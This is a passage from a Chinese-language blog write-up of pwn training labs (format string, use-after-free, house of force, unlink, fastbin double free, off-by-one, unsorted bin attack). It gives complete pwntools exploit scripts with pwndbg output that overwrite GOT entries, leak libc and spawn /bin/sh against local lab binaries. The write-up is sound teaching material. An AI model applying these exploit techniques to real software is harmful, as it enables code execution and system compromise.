06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
payload = &quot;%{}c%{}$hn&quot;.format((stack + 0x1c) &amp; 0xffff, 0x15)
#  payload += &quot;%{}c%{}$hn&quot;.format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)
payload += &quot;%{}c%{}$hn&quot;.format(0x10, 0x16)
payload += '22222222\0'
info(payload)
io.sendafter(&quot;11111111&quot;, payload)
pause()

'''
pwndbg&gt; x/3s 0x804a060
0x804a060 &lt;buf&gt;:	&quot;%40976c%57$hn%2&quot;...
0x804a06f &lt;buf+15&gt;:	&quot;c%59$hn33333333&quot;
0x804a07e &lt;buf+30&gt;:	&quot;&quot;
pwndbg&gt; stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 ('%409')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
#  gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
payload = &quot;%{}c%{}$hn&quot;.format(elf.got['printf'] &amp; 0xffff, 0x39)
#  payload += &quot;%{}c%{}$hn&quot;.format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)
payload += &quot;%{}c%{}$hn&quot;.format(2, 0x3b)
payload += &quot;33333333\0&quot;
info(payload)
io.sendafter(&quot;22222222&quot;, payload)
pause()

'''
pwndbg&gt; x/3s 0x804a060
0x804a060 &lt;buf&gt;:	&quot;%211c%11$hhn%31&quot;...
0x804a06f &lt;buf+15&gt;:	&quot;325c%7$hn444444&quot;...
0x804a07e &lt;buf+30&gt;:	&quot;44&quot;
pwndbg&gt; stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae9
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d46930
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
17:005c│      0xffa0781c ◂— 0x0
... ↓
pwndbg&gt; n
0x08048540 in do_fmt ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────[ REGISTERS ]────────────────────────
 EAX  0x7b38
 EBX  0x0
 ECX  0xffa052a0 ◂— 0x20202020 ('    ')
 EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ESI  0x1
 EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
 ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
 EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10
─────────────────────────[ DISASM ]──────────────────────────
   0x804853b &lt;do_fmt+64&gt;    call   printf@plt &lt;0x80483a0&gt;

 ► 0x8048540 &lt;do_fmt+69&gt;    add    esp, 0x10
   0x8048543 &lt;do_fmt+72&gt;    jmp    do_fmt+6 &lt;0x8048501&gt;
    ↓
   0x8048501 &lt;do_fmt+6&gt;     sub    esp, 4
   0x8048504 &lt;do_fmt+9&gt;     push   0xc8
   0x8048509 &lt;do_fmt+14&gt;    push   buf &lt;0x804a060&gt;
   0x804850e &lt;do_fmt+19&gt;    push   0
   0x8048510 &lt;do_fmt+21&gt;    call   read@plt &lt;0x8048390&gt;

   0x8048515 &lt;do_fmt+26&gt;    add    esp, 0x10
   0x8048518 &lt;do_fmt+29&gt;    sub    esp, 4
   0x804851b &lt;do_fmt+32&gt;    push   4
──────────────────────────[ STACK ]──────────────────────────
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
────────────────────────[ BACKTRACE ]────────────────────────
 ► f 0  8048540 do_fmt+69
   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16
   f 2 f7eb0d60 _IO_2_1_stdout_
   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18
   f 4 f7eb03dc __exit_funcs
   f 5 ffa07810
   f 6 f7d15276 __libc_start_main+246
pwndbg&gt; stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b30
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
17:005c│      0xffa0781c ◂— 0x0
... ↓
pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 6

[0x804a00c] read@GLIBC_2.0 -&gt; 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0
[0x804a010] printf@GLIBC_2.0 -&gt; 0xf7d37b30 (system) ◂— sub    esp, 0xc
[0x804a014] puts@GLIBC_2.0 -&gt; 0xf7d5c870 (puts) ◂— push   ebp
[0x804a018] __libc_start_main@GLIBC_2.0 -&gt; 0xf7d15180 (__libc_start_main) ◂— push   ebp
[0x804a01c] setvbuf@GLIBC_2.0 -&gt; 0xf7d5cff0 (setvbuf) ◂— push   ebp
[0x804a020] strncmp@GLIBC_2.0 -&gt; 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp
'''
#  gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
payload = &quot;%{}c%{}$hhn&quot;.format(libc.sym['system'] &gt;&gt; 16 &amp; 0xff, 0xb)
payload += &quot;%{}c%{}$hn&quot;.format((libc.sym['system'] &amp; 0xffff) - (libc.sym['system'] &gt;&gt; 16 &amp; 0xff), 0x7)
payload += '44444444\0'
info(payload)
io.sendafter(&quot;33333333&quot;, payload)
pause()

io.sendafter(&quot;44444444&quot;, &quot;/bin/sh\0&quot;)

io.interactive()
io.close()
</code></pre>

<blockquote>
<p>可以通过设置标记变量(如我 exp 中的 11111111, 22222222 等)进行定位</p>
</blockquote>

<h3 id="lab10-hacknote">lab10-hacknote</h3>

<p>最简单的一种 uaf 利用，结构体中有函数指针，通过 uaf 控制该函数指针指向 magic 函数即可，uaf 的介绍可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf"><strong>slide</strong></a></p>

<p>exp:</p>

<pre><code class="language-python">lab10 [master●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]

def debug():
    raw_input(&quot;DEBUG: &quot;)
    gdb.attach(io)

io = process(&quot;./hacknote&quot;)
elf = ELF(&quot;./hacknote&quot;)
magic_elf = elf.symbols[&quot;magic&quot;]


def addNote(size, content):
    io.sendafter(&quot;choice :&quot;, &quot;1&quot;)
    io.sendafter(&quot;size &quot;, str(size))
    io.sendafter(&quot;Content :&quot;, content)

def delNote(idx):
    #  debug()
    io.sendafter(&quot;choice :&quot;, &quot;2&quot;)
    io.sendafter(&quot;Index :&quot;, str(idx))

def printNote(idx):
    #  debug()
    io.sendafter(&quot;choice :&quot;, &quot;3&quot;)
    io.sendafter(&quot;Index :&quot;, str(idx))

def uaf():
    addNote(24, &quot;a&quot; * 24)
    addNote(24, &quot;b&quot; * 24)

    delNote(0)
    delNote(1)
    #  debug()
    addNote(8,p32(magic_elf))

    printNote(0)

if __name__ == &quot;__main__&quot;:
    uaf()
    io.interactive()
    io.close()
</code></pre>

<blockquote>
<p>说一下怎么修复 IDA 中的结构体</p>

<p>识别出结构体的具体结构后</p>

<ul>
<li>shift+F1, insert 插入识别出的结果</li>
</ul>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30oi6hn6j30qt0hgjsc.jpg" alt="" /></p>

<ul>
<li>shift+F9, insert 导入我们刚添加的 local type</li>
</ul>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30podbi2j31490m8jwq.jpg" alt="" /></p>

<ul>
<li>然后我们在结构体变量上 y 一下，制定其数据类型即可</li>
</ul>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30qp97hyj30nn06zt9k.jpg" alt="" /></p>

<ul>
<li>修复的效果图如下：</li>
</ul>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30rb5bzyj30gd03lmxn.jpg" alt="" /></p>
</blockquote>

<h3 id="lab11-bamboobox">lab11-bamboobox</h3>

<p>可以种 house of force，也可以使用 unlink，先说 house of force 的方法</p>

<h4 id="house-of-force">house of force</h4>

<p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显</p>

<pre><code class="language-python">lab11 [master●] cat hof.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from zio import l64
from time import sleep
import sys
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]

io = process(&quot;./bamboobox&quot;)

def DEBUG():
	raw_input(&quot;DEBUG: &quot;)
	gdb.attach(io)


def add(length, name):
    io.sendlineafter(&quot;:&quot;, &quot;2&quot;)
    io.sendlineafter(&quot;:&quot;, str(length))
    io.sendafter(&quot;:&quot;, name)

def change(idx, length, name):
    io.sendlineafter(&quot;:&quot;, &quot;3&quot;)
    io.sendlineafter(&quot;:&quot;, str(idx))
    io.sendlineafter(&quot;:&quot;, str(length))
    io.sendafter(&quot;:&quot;, name)

def exit():
    io.sendlineafter(&quot;:&quot;, &quot;5&quot;)

if __name__ == &quot;__main__&quot;:
    add(0x60, cyclic(0x60))
    #  DEBUG()
    change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa') # -(sizeof(item)) - sizeof(box) - 0x10
    add(0x10, p64(ELF(&quot;./bamboobox&quot;).sym['magic']) * 2)
    exit()

    io.interactive()
    io.close()
</code></pre>

<blockquote>
<p>快速确定需要 malloc 的大数/负数可以使用 Pwngdb 的 force 功能, 这里我做了一个 <a href="https://github.com/0x01f/Pwngdb">fork</a>, 把 Pwngdb 和 pwndbg 的功能做了一个合并</p>
</blockquote>

<h4 id="unlink">unlink</h4>

<p>至于 unlink，在这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf">slide</a>中有较大篇幅的介绍，就不在说明原理了</p>

<pre><code class="language-python">lab11 [master●] cat unlink.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]

io = process(&quot;./bamboobox&quot;)
# process(&quot;./bamboobox&quot;).libc will assign libc.address but ELF(&quot;./bamboobox&quot;) won't
#  libc = io.libc
elf = ELF(&quot;./bamboobox&quot;)
libc = elf.libc

def DEBUG():
	raw_input(&quot;DEBUG: &quot;)
	gdb.attach(io)

def show():
    io.sendlineafter(&quot;:&quot;, &quot;1&quot;)

def add(length, name):
    io.sendlineafter(&quot;:&quot;, &quot;2&quot;)
    io.sendlineafter(&quot;:&quot;, str(length))
    io.sendafter(&quot;:&quot;, name)

def change(idx, length, name):
    io.sendlineafter(&quot;:&quot;, &quot;3&quot;)
    io.sendlineafter(&quot;:&quot;, str(idx))
    io.sendlineafter(&quot;:&quot;, str(length))
    io.sendafter(&quot;:&quot;, name)

def remove(idx):
    io.sendlineafter(&quot;:&quot;, &quot;4&quot;)
    io.sendlineafter(&quot;:&quot;, str(idx))

def exit():
    io.sendlineafter(&quot;:&quot;, &quot;5&quot;)

if __name__ == &quot;__main__&quot;:
    add(0x40, '0' * 8)
    add(0x80, '1' * 8)
    add(0x40, '2' * 8)
    ptr = 0x6020c8

    fakeChunk = flat([0, 0x41, ptr - 0x18, ptr - 0x10, cyclic(0x20), 0x40, 0x90])
    change(0, 0x80, fakeChunk)
    remove(1)
    payload = flat([0, 0, 0x40, elf.got['atoi']])
    change(0, 0x80, payload)
    show()
    libc.address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
    success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))
    #  libcBase = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
    #  success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
    pause()

    change(0, 0x8, p64(libc.sym['system']))
    #  change(0, 0x8, p64(libcBase + libc.sym['system']))
    io.sendline('$0')

    io.interactive()
    io.close()
</code></pre>

<p>可以看出，通过 house of house 直接控制函数指针进而控制 ip 的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会</p>

<h3 id="lab12-secretgarden">lab12-secretgarden</h3>

<p>通过 double free 实现 fastbin attack 的题目，所谓double free，指的就是对同一个 allocated chunk free 两次，这样就可以形成一个类似 <strong>0  -&gt; 1 -&gt; 0</strong> 的 cycled bin list，这样当我们 malloc 出 0 时，就可以修改 bin list 中 0 的 fd，如 <strong>1 -&gt; 0 -&gt; target</strong>，这样只要我们再 malloc 三次，并通过 malloc 的检查，就可以实现 malloc 到任何地址，进而实现任意地址写，至于 double free 的检查怎么绕过可以看这个<a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></p>

<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]

def DEBUG():
    raw_input(&quot;DEBUG: &quot;)
    gdb.attach(io, &quot;b *0x4009F2&quot;)

def Raise(length, name):
    io.sendlineafter(&quot; : &quot;, &quot;1&quot;)
    io.sendlineafter(&quot; :&quot;, str(length))
    io.sendafter(&quot; :&quot;, name)
    io.sendlineafter(&quot; :&quot;, &quot;nb&quot;)

def remove(idx):
    io.sendlineafter(&quot; : &quot;, &quot;3&quot;)
    io.sendlineafter(&quot;:&quot;, str(idx))

if __name__ == &quot;__main__&quot;:
    #  io = process(&quot;./secretgarden&quot;, {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so&quot;})
    io = process(&quot;./secretgarden&quot;)

    Raise(0x50, &quot;000&quot;) # 0
    Raise(0x50, &quot;111&quot;) # 1

    remove(0) # 0
    #  pause()
    remove(1) # 1 -&gt; 0
    remove(0) # 0 -&gt; 1 -&gt; 0

    magic = ELF(&quot;./secretgarden&quot;).sym[&quot;magic&quot;]
    #  fakeChunk = 0x602028 + 2 - 8
    fakeChunk = 0x602000+2-8

    Raise(0x50, p64(fakeChunk)) # 0
    Raise(0x50, &quot;111&quot;) # 1
    Raise(0x50, &quot;000&quot;)
    #  DEBUG()
    #  payload = cyclic(8 - 2) + p64(magic) * 8
    payload = cyclic(8 + 8 - 2) + p64(magic) * 2
    Raise(0x50, payload)

    io.interactive()
    io.close()

</code></pre>

<blockquote>
<p>以上的 exp 实现了通过 fastbin attack 来修改 got, 实际上通过 fastbin attack 来修改 __malloc_hook, __realloc_hook, __free_hook, IO_file_plus 结构体中的 jump_table 也是很常见的做法, 尤其是程序开了 Full Relro 保护时
pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考这篇 <a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/">writeup</a></p>
</blockquote>

<h3 id="lab13-heapcreator">lab13-heapcreator</h3>

<p>在 edit_heap 中有一个故意留下来的 off-by-one，并且不是 off-by-one null byte，因此可以使用 extended chunk 这种技巧造成 overlapping chunk，进而通过将 *content 覆写为某函数的 got (如 free/atoi )就可以 leak 出 libc 的地址，然后将改写为 system 的地址，控制参数即可 get shell</p>

<p>关于 extended chunk 的介绍可以看这个 <strong><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></strong></p>

<pre><code class="language-python">lab13 [master●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = &quot;debug&quot;

def create(size, content):
    io.sendlineafter(&quot; :&quot;, &quot;1&quot;)
    io.sendlineafter(&quot; : &quot;, str(size))
    io.sendlineafter(&quot;:&quot;, content)

def edit(idx, content):
    io.sendlineafter(&quot; :&quot;, &quot;2&quot;)
    io.sendlineafter(&quot; :&quot;, str(idx))
    io.sendlineafter(&quot; : &quot;, content)

def show(idx):
    io.sendlineafter(&quot; :&quot;, &quot;3&quot;)
    io.sendlineafter(&quot; :&quot;, str(idx))

def delete(idx):
    io.sendlineafter(&quot; :&quot;, &quot;4&quot;)
    io.sendlineafter(&quot; :&quot;, str(idx))

if __name__ == &quot;__main__&quot;:
    io = process(&quot;./heapcreator&quot;, {&quot;LD_LOADPRE&quot;: &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;})
    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)

    create(0x18, '0000') # 0
    create(0x10, '1111') # 1

    payload = &quot;/bin/sh\0&quot; + cyclic(0x10) + p8(0x41)
    edit(0, payload) # overwrite 1

    delete(1) # overlapping chunk

    freeGot = 0x0000000000602018
    payload = p64(0) * 4 + p64(0x30) + p64(freeGot)
    create(0x30, payload)
    show(1)

    libcBase = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &quot;\x00&quot;)) - libc.sym[&quot;free&quot;]
    success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
    #  pause()
    edit(1, p64(libcBase + libc.sym[&quot;system&quot;]))

    delete(0)
    io.interactive()
    io.close()
</code></pre>

<h3 id="lab14-magicheap">lab14-magicheap</h3>

<p>unsorted bin attack</p>

<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]

io = process(&quot;./magicheap&quot;)
elf = ELF(&quot;./magicheap&quot;)
#  libc = ELF(&quot;&quot;)

def DEBUG():
    raw_input(&quot;DEBUG: &quot;)
    gdb.attach(io)


def create(size, content, attack = False):
    io.sendlineafter(&quot;choice :&quot;, &quot;1&quot;)
    io.sendlineafter(&quot; : &quot;, str(size))
    io.sendlineafter(&quot;:&quot;, content)


def edit(idx, size, content):
    io.sendlineafter(&quot;choice :&quot;, &quot;2&quot;)
    io.sendlineafter(&quot; :&quot;, str(idx))
    io.sendlineafter(&quot; : &quot;, str(size))
    io.sendlineafter(&quot; : &quot;, content)

def delete(idx):
    io.sendlineafter(&quot;choice :&quot;, &quot;3&quot;)
    io.sendlineafter(&quot; :&quot;, str(idx))


if __name__ == &quot;__main__&quot;:
    create(0x10, 'aaaa')
    create(0x80, 'bbbb')
    create(0x10, 'cccc')

    delete(1)

    payload = cyclic(0x10) + p64(0) + p64(0x91) + p64(0) + p64(elf.symbols[&quot;magic&quot;] - 0x10)
    edit(0, 0x10 + 0x20, payload)

    create(0x80, 'dddd')

    io.sendlineafter(&quot;choice :&quot;, &quot;4869&quot;)
    io.interactive()
    io.close()

</code></pre>

<h3 id="lab15-zoo">lab15-zoo</h3>

<p><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf">pwn in C++</a></p>


  </main>

<footer class="tc center bt b--near-white pvx phm pax-m phxl-l pvx-l">
        <small class="f5 mw7 db center phm lh-copy">
		  <nav>
			  <ul class="list pln">
				  <li class="dib prm"><a href="https://www.github.com/0x01f"><span class="js-geomicon geomicon blue" data-icon="github"></span></a></li>
                  
			  </ul>
			  </nav>
              Copyright-  2018
        </small>
    </footer>
    <script src="http://d2v52k3cl9vedd.cloudfront.net/geomicons/0.2.0/geomicons.min.js.gz"></script>
    <script>
        var icons = document.querySelectorAll('.geomicon');
        Geomicons.inject(icons);
    </script>
  </body>
</html>

